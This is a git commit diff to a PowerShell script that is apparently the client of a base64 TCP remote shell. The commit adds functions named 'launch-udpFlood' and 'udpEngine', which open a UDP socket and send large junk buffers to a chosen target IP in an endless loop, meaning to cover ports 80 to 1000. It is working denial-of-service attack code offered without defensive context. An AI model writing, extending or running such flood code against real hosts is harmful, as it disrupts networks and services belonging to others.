7d69d775680083911a6807cd23d6a23cf5d37383
xor-function <xor-function@users.noreply.github.com>
2016-07-13 01:07:09 -0500

    Update b64-client.ps1
    added function

--- base64-tcp-shell/b64-tcp-client.ps1
+++ base64-tcp-shell/b64-tcp-client.ps1
@@ -373,6 +373,67 @@ function askfor-creds {
 
 }
 
+function launch-udpFlood {
+
+	[CmdletBinding()] Param(
+	
+	[Parameter(Position=0)]
+	[String]$targetIP
+
+	)
+
+	## Check IP variable
+	
+	if ($targetIP) {
+	
+		# launch udp flood on range of ports
+		foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }
+
+	} else { write-output "[!] target IP not specified, required!" }
+	
+}
+
+function udpEngine {
+
+	[CmdletBinding()] Param(
+	
+	[Parameter(Position=0, Mandatory = $true)]
+	[String]$tIP,
+	
+	[Parameter(Position=1, Mandatory = $true)]
+	[String]$prt
+	
+	)
+	
+	$address = [system.net.IPAddress]::Parse( $tIP )  
+
+	# Create IP Endpoint   
+	$end = New-Object System.Net.IPEndPoint $address , $prt 
+
+	# Create Socket   
+	$Saddrf    = [System.Net.Sockets.AddressFamily]::InterNetwork  
+	$Stype    = [System.Net.Sockets.SocketType]::Dgram  
+	$Ptype     = [System.Net.Sockets.ProtocolType]::UDP  
+	$Sock      = New-Object System.Net.Sockets.Socket $saddrf , $stype , $ptype   
+	$Sock.TTL = 26
+  
+  
+	while ($true) {
+  
+		# Connect to socket   
+		$sock.Connect( $end )  
+
+		# Create encoded buffer insert loop here that get data from the generated file
+		$Enc = [System.Text.Encoding]::ASCII
+		$Message = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890" * 700
+		$Buffer  = $Enc.GetBytes( $Message )  
+
+		# Send the buffer   
+		$Sent   = $Sock.Send( $Buffer )  
+	}
+
+}
+
 
 function gen-enccmd {
 
